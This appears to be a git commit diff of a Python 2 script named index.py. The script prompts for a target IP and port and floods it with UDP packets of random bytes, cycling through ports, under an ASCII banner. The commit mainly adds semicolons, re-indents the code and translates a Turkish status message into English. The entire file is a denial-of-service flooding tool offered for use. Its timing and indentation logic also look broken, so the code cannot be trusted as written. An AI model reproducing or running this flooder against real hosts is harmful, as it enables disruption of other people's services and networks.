9cb42f87dd3fb7d4794b35ac1c3a63477132d201
BroMasters <36071011+BroMasters@users.noreply.github.com>
2019-08-22 17:49:14 +0300

    Update index.py

--- index.py
+++ index.py
@@ -1,19 +1,19 @@
-import sys
-import os
-import time
-import socket
-import random
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(10000)
-timeout = time.time()
-os.system ("clear")
+import sys;
+import os;
+import time;
+import socket;
+import random;
+from datetime import datetime;
+now = datetime.now();
+hour = now.hour;
+minute = now.minute;
+day = now.day;
+month = now.month;
+year = now.year;
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
+bytes = random._urandom(10000);
+timeout = time.time();
+os.system ("clear");
 print ("""
 \033[1;36;40m
  ______   _______  _______  _______  _______  _______ 
@@ -24,19 +24,19 @@ print ("""
 |       ||       | _____| || |_|   ||       |  |   |  
 |______| |_______||_______||_______||_______|  |___|  
 """)
-ip = raw_input("\033[1;33;40mIP: ")
-port = input("\033[1;33;40mPort: ")
-os.system("clear")
-sent = 0
+ip = raw_input("\033[1;33;40mIP: ");
+port = input("\033[1;33;40mPort: ");
+os.system("clear");
+sent = 0;
 while True:
-  while 1:
-    if time.time() > timeout:
-      break
-    else:
-      pass
-    sock.sendto(bytes, (ip,port))
-    sent = sent + 1
-    port = port + 1
-    print "\033[0;32;47m%sent. paket, %ip adresine; %port portuyla gonderildi" %(sent,ip,port)
-    if port == 65534:
-      port = 1
+     while 1:
+       if time.time() > timeout:
+         break;
+       else:
+         pass;
+         sock.sendto(bytes, (ip, port));
+         sent = sent + 1;
+         port = port + 1;
+         print "\033[92mSent %s packet to %s throught port:%s successful"%(sent,ip,port);
+         if port == 65534:
+           port = 1;
